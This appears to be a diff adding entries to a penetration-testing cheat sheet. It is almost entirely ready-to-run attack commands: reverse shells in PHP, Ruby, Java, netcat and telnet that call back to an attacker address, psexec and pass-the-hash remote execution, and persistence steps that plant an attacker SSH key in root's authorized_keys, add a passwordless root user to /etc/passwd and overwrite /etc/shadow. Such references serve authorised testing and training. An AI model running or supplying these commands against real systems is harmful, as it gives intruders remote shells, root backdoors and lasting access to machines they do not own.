@@ -130,15 +130,22 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-##### Netcat without -e
+##### Netcat without -e #1
 ```bash
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
+```
+
+##### Netcat without -e #2
+```bash
+nc localhost 443 | /bin/sh | nc localhost 444
+telnet localhost 443 | /bin/sh | telnet localhost 444```
 ```
 
 ##### Java
 ```bash
 r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
 ```
+
 ##### XTerm
 ```bash
 xterm -display 10.0.0.1:1
@@ -254,6 +261,11 @@ mssqlclient.py -port 27900 user:password@10.1.1.1
 sqsh -S 10.1.1.1 -U user -P password
 ```
 
+#### Upgradig Non-Interactive Shell
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")'
+/bin/busybox sh
+```
 
 ## Local Enumeration & Privilege Escalation
 
@@ -465,6 +477,11 @@ runas /user:userName cmd.exe
 psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
 ```
 
+##### Pth-WinExe
+```bash
+pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe
+```
+
 #### Recursively Find Hidden Files: Windows
 ```bash
 dir /A:H /s "c:\program files"
@@ -492,6 +509,19 @@ wine vncpwdump.exe -k key
 #### Creating User and Adding to Local Administrators
 ```bash
 net user spotless spotless /add & net localgroup Administrators spotless /add 
+```
+
+#### Creating SSH Authorized Keys
+```bash
+mkdir /root/.ssh 2>/dev/null; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali' >> /root/.ssh/authorized_keys
+```
+
+#### Creating Backdoor User w/o Password
+```bash
+echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# Rarely needed, but if you need to add a password to the previously created user by using useradd and passwd is not working. Pwd is "kali"
+sed 's/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./' /etc/shadow > /etc/s2; cat /etc/s2 > /etc/shadow; rm /etc/s2
 ```
 
 #### Persistent Back Doors
